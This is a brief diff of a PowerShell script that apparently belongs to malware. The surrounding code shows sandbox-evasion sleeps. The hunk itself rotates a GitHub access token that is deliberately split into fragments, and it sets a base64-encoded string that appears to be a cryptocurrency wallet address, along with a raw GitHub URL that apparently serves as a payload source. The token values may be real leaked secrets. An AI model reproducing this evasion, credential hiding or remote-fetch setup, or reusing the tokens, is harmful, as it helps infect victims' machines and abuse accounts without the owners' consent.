@@ -41,7 +41,7 @@ if (Test-Sandbox) { Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30); r
 # === CONFIG (fragmented) ===
 $c = @{}
 $c.u1 = 'HolyV200'; $c.u2 = 'test-repo'
-$p1 = 'ghp_G2U25oVay3'; $p2 = 'cjS3UPSG7UVWgTadp9510WWFLD'
+$p1 = 'ghp_x0tf1YFQcn'; $p2 = 'AYM79aWZpnZKahM8QkHV2lHFLw'
 $c.pat = $p1 + $p2
 $c.addr = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NDQ4M0cxQWdTMXBkc0xxenQzbkZRbUw4SFBGM0MyV1ZyTE1SQWRBVkdxeHo2aXBWM2FGOG5vN2NtRGtINHdNWno5WUQ1cU5VWjk2bkdMTUtwZHQ1clhacU13R2ZMYzM='))
 $c.base = "https://raw.githubusercontent.com/$($c.u1)/$($c.u2)/main"
